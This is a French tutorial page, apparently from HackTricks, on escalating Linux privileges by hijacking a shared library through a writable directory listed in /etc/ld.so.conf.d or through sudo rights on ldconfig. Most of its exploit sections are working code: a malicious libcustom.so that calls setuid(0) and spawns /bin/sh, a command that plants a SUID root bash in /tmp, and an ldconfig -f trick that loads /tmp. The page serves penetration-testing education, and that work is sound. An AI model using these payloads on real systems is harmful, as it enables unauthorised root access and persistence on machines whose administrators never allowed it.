# Exemple d’exploit de privesc avec ld.so

{{#include ../../banners/hacktricks-training.md}}

## Préparer l’environnement

Dans la section suivante, vous trouverez le code des fichiers que nous allons utiliser pour préparer l’environnement.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Créez** ces fichiers sur votre machine, dans le même dossier
2. **Compilez la** **library** : `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copiez** `libcustom.so` dans `/usr/lib` et actualisez le cache : `sudo cp libcustom.so /usr/lib && sudo ldconfig` (privilèges root)
4. **Compilez l'** **exécutable** : `gcc sharedvuln.c -o sharedvuln -lcustom`

### Vérifier l'environnement

Vérifiez que _libcustom.so_ est **chargée** depuis _/usr/lib_ et que vous pouvez **exécuter** le binaire.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Commandes utiles de triage

Lors de l’attaque d’une cible réelle, vérifiez le **nom exact de la bibliothèque** dont le binaire a besoin et ce que le loader est **actuellement en train de résoudre** :
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Quelques pièges utiles :

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` **ne fonctionne généralement pas**, car
la redirection est effectuée par votre shell actuel. Utilisez plutôt
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- Les binaires **SUID/privileged** ignorent `LD_LIBRARY_PATH`/`LD_PRELOAD` en
**secure-execution mode**, mais les répertoires provenant de `/etc/ld.so.conf` font
toujours partie de la configuration approuvée du loader. Cette mauvaise configuration
peut donc toujours affecter les programmes privileged.<sup>[[1]](#references)</sup>
- Dans les versions plus récentes de glibc, le dynamic loader expose également
`--list-diagnostics`, ce qui est pratique pour déboguer la résolution du cache et la
sélection des sous-répertoires `glibc-hwcaps` lorsqu'un hijack ne se comporte pas
comme prévu.<sup>[[1]](#references)</sup>

## Exploit

Dans ce scénario, nous allons supposer que **quelqu'un a créé une entrée vulnérable** dans un fichier situé dans _/etc/ld.so.conf/_ :
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Le dossier vulnérable est _/home/ubuntu/lib_ (auquel nous avons un accès en écriture).\
**Téléchargez et compilez** le code suivant dans ce chemin :
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Si vous vous attendez à ce que **root** (ou un autre compte privilégié) exécute ultérieurement le binaire vulnérable, il est généralement préférable de laisser un **artefact appartenant à root** plutôt que de lancer un shell interactif. Par exemple :
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Ensuite, après l'exécution privilégiée, vous pouvez utiliser `/tmp/rootbash -p`.

Maintenant que nous avons **créé la bibliothèque libcustom malveillante dans le chemin mal configuré**, nous devons attendre un **redémarrage** ou que l'utilisateur root exécute **`ldconfig`** (_si vous pouvez exécuter ce binaire avec **sudo** ou s'il possède le **suid bit**, vous pourrez l'exécuter vous-même_).

Une fois cela fait, **vérifiez à nouveau** depuis quel emplacement l'exécutable `sharedvuln` charge la bibliothèque `libcustom.so` :
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Comme vous pouvez le voir, il le charge depuis **`/home/ubuntu/lib`** et si un utilisateur l’exécute, un shell sera exécuté :
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Notez que dans cet exemple, nous n'avons pas escaladé les privilèges, mais en modifiant les commandes exécutées et en **attendant qu'un utilisateur root ou un autre utilisateur privilégié exécute le binaire vulnérable**, nous pourrons escalader les privilèges.

### Autres misconfigurations - Même vuln

Dans l'exemple précédent, nous avons simulé une misconfiguration où un administrateur **a défini un dossier non privilégié à l'intérieur d'un fichier de configuration dans `/etc/ld.so.conf.d/`**.\
Mais il existe d'autres misconfigurations pouvant causer la même vulnérabilité : si vous avez des **permissions d'écriture** dans un **fichier de configuration** situé dans `/etc/ld.so.conf.d`, dans le dossier `/etc/ld.so.conf.d` ou dans le fichier `/etc/ld.so.conf`, vous pouvez configurer la même vulnérabilité et l'exploiter.

## Exploit 2

**Supposons que vous disposez de privilèges sudo sur `ldconfig`**.\
Vous pouvez indiquer à `ldconfig` **où charger les fichiers de configuration**, ce qui nous permet d'en tirer parti pour faire charger à `ldconfig` des dossiers arbitraires.<sup>[[2]](#references)</sup>\
Créons donc les fichiers et dossiers nécessaires pour charger "/tmp" :
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Maintenant, comme indiqué dans l’**exploit précédent**, **créez la bibliothèque malveillante dans `/tmp`**.\
Et enfin, chargeons le chemin et vérifions depuis où le binaire charge la bibliothèque :
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Comme vous pouvez le voir, disposer de privilèges sudo sur `ldconfig` permet d’exploiter la même vulnérabilité.**

## Références

- [1] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)

{{#include ../../banners/hacktricks-training.md}}
